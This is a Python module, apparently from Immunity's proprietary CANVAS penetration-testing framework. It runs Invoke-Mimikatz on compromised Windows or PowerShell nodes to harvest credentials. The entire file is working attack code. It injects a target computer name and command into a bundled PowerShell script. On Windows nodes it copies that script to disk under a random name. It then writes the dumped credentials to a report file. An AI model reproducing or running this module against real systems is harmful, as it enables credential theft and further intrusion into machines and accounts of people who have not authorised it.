#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2015
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

import os, getopt, string
import socket
import locale
from tempfile import NamedTemporaryFile
from exploitutils import *
import logging
from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand

import canvasengine

NAME                            = "ps_invokemimikatz"
DESCRIPTION                     = "Gather credentials and other informating from the host using Mimikatz"
VERSION                         = "1.0"

DOCUMENTATION                   = {}
DOCUMENTATION["Notes"]          = """
Run the Invoke-Mimikatz on the PowerShell Node.

Function: Invoke-Mimikatz
Author: Joe Bialek, Twitter: @JosephBialek
Mimikatz Author: Benjamin DELPY `gentilkiwi`. Blog: http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter @gentilkiwi
License:  http://creativecommons.org/licenses/by/3.0/fr/
Required Dependencies: Mimikatz (included)
Optional Dependencies: None
Mimikatz version: 2.0 alpha (12/14/2015)
"""


PROPERTY                        = {}
PROPERTY['TYPE']                = "Commands"
PROPERTY['SITE']                = "Local"
PROPERTY['ARCH']                = [ ["Windows"] ]


class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result         = ""
        self.genTime        = str(int(time.time()))  
        self.computer       = ""
        self.command        = ""
        return

    def getargs(self):
        self.command         = self.argsDict.get("command", self.command)
        self.computer        = self.argsDict.get("computer", self.computer)
        
    def outputFile(self, results):
        temp = os.path.join("mimkatz", (self.genTime)) 
        self.savePath = self.output(ip=self.target_ip, subdir=temp)
        body = str(results)
        # Write the file
        fileName = "mimikatz-" + self.computer + self.genTime +".txt"
        saveFile = os.path.join(self.savePath, fileName)
        file = open(saveFile, "w")
        file.write(body)
        file.close()    
        return 0

    def run(self):
        self.getargs()
        self.setInfo("%s (in progress)" % (NAME))
        ret = False
        for node in self.argsDict["passednodes"]:
            self.target_ip    = node.get_interesting_interface()
            ntype = node.nodetype
            shell = node.shell
            if ntype == "PowerShellNode" or ntype in ["win32Node", "win64Node"]:
                tfile  = file_utf8_encoding( open( os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/", "invokeMimikatz.ps1")), "rb").read() )
                tfile  = tfile.replace("HELLOCOMPUTER", str(self.computer))
                tfile  = tfile.replace("HELLOCOMMAND", str(self.command))
                runpow = canvasengine.getModuleExploit("runpowershellscript")
                runpow.link(self)
                runpow.argsDict["PSBuffer"]   = tfile

                if ntype in ["win32Node", "win64Node"]:
                    # the script is too big to be executed in memory
                    # in a windows node, so we neeed copy to disk
                    runpow.argsDict["filename"] = randomstring(8) + ".ps1"
                    runpow.argsDict["copytodisk"] = True
                else:
                    runpow.argsDict["copytodisk"] = False

                runpow.argsDict["showresults"] = False
                ret = runpow.run()
                self.result = runpow.result
                self.outputFile(self.result)
                logging.info ("Mimikatz results retrieved. Full results in Report directory")                
                self.setInfo("%s - done (success)" % NAME)
                ret = True
            else:
                logging.info("Please run this module from a PowerShell or Windows node" )
                self.setInfo("%s - done (failed)" % NAME)
                ret = False

        return ret
